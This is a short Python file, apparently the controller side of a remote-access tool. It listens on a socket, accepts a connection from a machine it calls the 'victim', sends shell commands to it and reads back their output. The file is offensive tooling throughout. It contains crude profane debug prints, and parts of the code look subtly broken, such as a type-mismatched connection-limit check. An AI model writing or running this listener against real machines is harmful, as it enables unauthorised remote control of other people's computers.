import socket

victim = 0
victim_address = 0

def listen(ip: str, port: int, connectionLimit, q):
    global victim, victim_address
    try:
        if not connectionLimit.isdigit():
            connectionLimit = 1
        print(port)
        server = socket.socket()
        server.bind((ip, port))
        server.listen(connectionLimit)
        victim, victim_address = server.accept()
        q.put((victim, victim_address))
    except Exception as e:
        print(e)


def sendCommand(command: str, q):
    try:
        print("anus")
        victim, victim_address = q.get()
        print("shit")
        customOutput = ''
        if len(command) < 1:
            customOutput = "Command cannot be null"
            command = 'cd'
        if command == 'say' or command == 'python' or command == 'python3':
            customOutput = 'Command cancelled because the written command breaks connection.'
            command = 'cd'
    except Exception as exc:
        print(exc)
    try:
        victim.send(command.encode())
        output = victim.recv(1000000000).decode()
        return output, customOutput
    except Exception as ex:
        if type(ex) == AttributeError:
            print("No victim is connected")
        print(ex)
